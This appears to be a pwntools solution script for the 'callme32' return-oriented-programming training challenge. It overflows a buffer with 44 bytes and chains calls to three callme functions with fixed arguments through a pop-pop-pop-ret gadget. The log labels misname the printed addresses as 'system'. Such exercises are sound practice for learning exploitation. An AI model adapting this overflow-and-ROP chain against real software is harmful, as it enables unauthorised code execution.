from pwn import * 

p = process('./callme32')
binary = ELF('./callme32')

callme = binary.symbols['callme_one']
log.info('Address system : {}'.format(hex(callme)))
callme_2 = binary.symbols['callme_two']
log.info('Address system : {}'.format(hex(callme_2)))
callme_3 = binary.symbols['callme_three']
log.info('Address system : {}'.format(hex(callme_3)))
# pdi = p32(0x080487f8)
# log.info('Address PDI : {}'.format(pdi))

payload = "a"*44
payload += p32(callme)
payload += p32(0x080487f9) #ropgadget  pop esi ; pop edi ; pop ebp ; ret
payload += p32(0xdeadbeef)
payload += p32(0xcafebabe)
payload += p32(0xd00df00d)
payload += p32(callme_2)
payload += p32(0x080487f9) 
payload += p32(0xdeadbeef)
payload += p32(0xcafebabe)
payload += p32(0xd00df00d)
payload += p32(callme_3)
payload += p32(0x080487f8)
payload += p32(0xdeadbeef)
payload += p32(0xcafebabe)
payload += p32(0xd00df00d)

p.sendline(payload)
p.interactive()